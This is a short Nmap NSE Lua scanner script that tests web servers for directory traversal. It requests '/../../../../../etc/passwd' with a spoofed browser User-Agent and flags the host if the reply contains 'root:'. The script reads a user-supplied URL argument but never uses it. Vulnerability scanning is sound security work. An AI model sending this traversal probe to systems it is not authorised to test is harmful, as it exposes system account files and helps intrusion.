description = [[
Path traversal
]]

local http = require "http"
local shortport = require "shortport"
local vulns = require "vulns"
local stdnse = require "stdnse"
local string = require "string"

---
-- @hackyseguridad
-- nmap -p <port> --script directorio <target>
--

author = "hackingyseguridad.com"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "vuln" }

portrule = shortport.http

action = function(host, port)
  local vuln = {
    title = "Detecta directorio traversal",
    state = vulns.STATE.NOT_VULN,
    description = [[
    ]],
    IDS = {
        CWE = "CWE-22"
    },
    references = {
        'http://www.hackingyseguridad.com',
    },
    dates = {
        disclosure = { year = '2001', month = '04', day = '24' }
    }
  }

   -- Send a simple GET request to the server, if it returns appropiate string, then you have a vuln host
 options = {header={}}    options['header']['User-Agent'] = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
 --local req = http.get(host, port, uri, options)
 local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
 local url = stdnse.get_script_args(SCRIPT_NAME..".url") or "/../../../../../etc/passwd"
 local response = http.generic_request(host, port, "GET", "/../../../../../etc/passwd", options)

 if response.status == 200 and string.match(response.body, "root:")  then
 -- if response.status == 200 then
 vuln.state = vulns.STATE.VULN
 end

 return vuln_report:make_output(vuln)
end
